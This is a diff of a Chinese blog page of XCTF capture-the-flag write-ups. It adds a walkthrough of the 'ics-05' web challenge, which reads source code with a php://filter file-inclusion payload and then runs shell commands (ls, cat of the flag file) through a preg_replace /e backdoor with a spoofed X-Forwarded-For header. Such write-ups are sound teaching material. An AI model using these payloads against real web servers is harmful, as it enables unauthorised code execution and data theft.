@@ -130,7 +130,14 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925210125.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925211156.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925211447.png">
-<meta property="og:updated_time" content="2019-09-25T13:19:39.777Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214550.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214842.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925215838.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925220520.png">
+<meta property="og:updated_time" content="2019-09-25T14:07:00.606Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Xctf部分题目">
 <meta name="twitter:description" content="XCTF">
@@ -423,7 +430,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-09-25 21:19:39" itemprop="dateModified" datetime="2019-09-25T21:19:39+08:00">2019-09-25</time>
+                <time title="修改时间：2019-09-25 22:07:00" itemprop="dateModified" datetime="2019-09-25T22:07:00+08:00">2019-09-25</time>
               
             
           </span>
@@ -575,6 +582,17 @@ for i in s:
 <pre><code>/index.php?url=@/opt/api/api/settings.py
 </code></pre><p>将得到的html保存下来打开可以找到数据库信息<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925211156.png" alt></p>
 <p>按上面的方法继续访问数据库文件，html保存下来打开，可以找到flag。<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925211447.png" alt></p>
+<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p>题目描述<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214204.png" alt>得知有一个后门可以利用。</p>
+<p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214236.png" alt>访问所有页面发现只有设备维护中心能够打开。<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214346.png" alt>想到文件包含。</p>
+<p>使用filter伪协议读取index.php的内容：</p>
+<pre><code>index.php?page=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre><p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214550.png" alt><br>得到一串base64.<br>解码得到一段php代码。结合题目描述寻找后门，在程序的最后发现<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925214842.png" alt><br>该后门是利用的preg_replace函数的漏洞：当该函数的第一个参数pattern采用了/e的正则模式时，该函数会将第二个参数replacement作为代码执行。</p>
+<p>所以抓包添加x-forwarded-for:127.0.0.1并且url中?pat=/.*/e&amp;rep=system(‘ls’)&amp;sub=foo</p>
+<p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925215838.png" alt><br>成功执行。</p>
+<p>接下来更改rep为system(‘ls+s3chahahaDir’)</p>
+<p>system(‘ls+s3chahahaDir/flag’)</p>
+<p>system(‘cat+s3chahahaDir/flag/flag.php’)<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190925220520.png" alt></p>
+<p>### </p>
 
       
     </div>
@@ -831,7 +849,7 @@ for i in s:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目来源"><span class="nav-number">1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#新手题"><span class="nav-number">2.1.</span> <span class="nav-text">新手题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#backup"><span class="nav-number">2.1.1.</span> <span class="nav-text">backup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-js"><span class="nav-number">2.1.2.</span> <span class="nav-text">simple js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weak-auth"><span class="nav-number">2.1.3.</span> <span class="nav-text">weak auth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webshell"><span class="nav-number">2.1.4.</span> <span class="nav-text">webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#蚁剑"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">蚁剑:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POST"><span class="nav-number">2.1.5.</span> <span class="nav-text">POST:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#command-execution"><span class="nav-number">2.1.6.</span> <span class="nav-text">command_execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-php"><span class="nav-number">2.1.7.</span> <span class="nav-text">simple_php</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进阶题"><span class="nav-number">2.2.</span> <span class="nav-text">进阶题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cat"><span class="nav-number">2.2.1.</span> <span class="nav-text">cat</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目来源"><span class="nav-number">1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#新手题"><span class="nav-number">2.1.</span> <span class="nav-text">新手题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#backup"><span class="nav-number">2.1.1.</span> <span class="nav-text">backup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-js"><span class="nav-number">2.1.2.</span> <span class="nav-text">simple js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weak-auth"><span class="nav-number">2.1.3.</span> <span class="nav-text">weak auth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webshell"><span class="nav-number">2.1.4.</span> <span class="nav-text">webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#蚁剑"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">蚁剑:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POST"><span class="nav-number">2.1.5.</span> <span class="nav-text">POST:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#command-execution"><span class="nav-number">2.1.6.</span> <span class="nav-text">command_execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-php"><span class="nav-number">2.1.7.</span> <span class="nav-text">simple_php</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进阶题"><span class="nav-number">2.2.</span> <span class="nav-text">进阶题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cat"><span class="nav-number">2.2.1.</span> <span class="nav-text">cat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ics-05"><span class="nav-number">2.2.2.</span> <span class="nav-text">ics-05</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
